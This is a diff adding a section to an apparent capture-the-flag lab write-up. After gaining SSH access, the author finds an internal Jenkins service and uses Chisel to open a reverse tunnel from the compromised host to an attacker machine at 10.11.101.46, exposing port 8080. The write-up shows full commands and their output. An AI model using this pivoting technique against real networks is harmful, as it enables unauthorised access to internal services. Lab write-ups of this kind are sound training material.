@@ -176,7 +176,49 @@ www-data@internal:/opt$
 
 -------------------------------------------------------------------------------------
 
-### PRIVILEGE ESCALTION ROOT ###
+### Tunnel Jenkins Server ###
++ After login successfully SSH user "aubreanna", we had the file name "jenkins.txt" and read it.
 
+```bash
+aubreanna@internal:~$ ls
+jenkins.txt  snap  user.txt
+aubreanna@internal:~$ cat jenkins.txt 
+Internal Jenkins service is running on 172.17.0.2:8080
+```
 
++ We've found the server Jenkins is running but we can't access directly into the Jenkins so we will check it:
+
+```bash
+aubreanna@internal:~$ ss -tl
+State     Recv-Q      Send-Q            Local Address:Port               Peer Address:Port     
+LISTEN    0           128                   127.0.0.1:33299                   0.0.0.0:*        
+LISTEN    0           128               127.0.0.53%lo:domain                  0.0.0.0:*        
+LISTEN    0           128                     0.0.0.0:ssh                     0.0.0.0:*        
+LISTEN    0           80                    127.0.0.1:mysql                   0.0.0.0:*        
+LISTEN    0           128                   127.0.0.1:http-alt                0.0.0.0:*        
+LISTEN    0           128                        [::]:ssh                        [::]:*        
+LISTEN    0           128                           *:http                          *:*   
+```
+
++ We've seen "127.0.0.1:http-alt" that is port 8080 also is port Jenkins server which is running.
++ Now we will use Tunnel to create the way accessing the Jenkins. We use tool "Chisel" to create the Tunnel.
+
+```bash
+zicco@z-a:/usr/bin$ chisel server -p 5555 --reverse
+2024/11/16 15:34:08 server: Reverse tunnelling enabled
+2024/11/16 15:34:08 server: Fingerprint qfX9SVjQY9DeTP/8LeaLgu29Us/gDcfEq3KOJQQCf5U=
+2024/11/16 15:34:08 server: Listening on http://0.0.0.0:5555
+2024/11/16 15:37:33 server: session#1: tun: proxy#R:8080=>8080: Listening
+```
+
+```bash
+aubreanna@internal:~$ ./chisel client 10.11.101.46:5555 R:8080:127.0.0.1:8080 &
+[1] 2080
+aubreanna@internal:~$ 2024/11/16 08:37:32 client: Connecting to ws://10.11.101.46:5555
+2024/11/16 08:37:34 client: Connected (Latency 304.454537ms)
+```
+
+![alt text](image-2.png)
+
++ 
 
